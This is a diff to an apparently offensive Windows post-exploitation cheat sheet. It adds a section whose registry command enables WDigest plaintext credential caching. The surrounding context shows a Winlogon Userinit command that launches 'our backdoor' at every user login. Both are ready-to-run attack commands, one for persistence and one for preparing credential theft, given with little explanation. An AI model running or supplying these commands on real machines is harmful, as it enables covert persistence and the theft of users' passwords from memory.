@@ -7,6 +7,7 @@
 - [Hosts File](#hosts-file)
 - [UAC](#uac)
 - [WinLogon](#winlogon)
+- [WDigest](#wdigest)
 
 ### Startup Programs
 ```
@@ -54,3 +55,9 @@ The value of **EnableLua** is 0x1 for UAC enabled, 0x0 for disabled (REG_DWORD)
 `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BACKDOOR>" /f`
 
 When a user logs in Userinit.exe will be executed and then our backdoor.
+
+### WDigest
+
+`reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`
+
+Enables WDigest
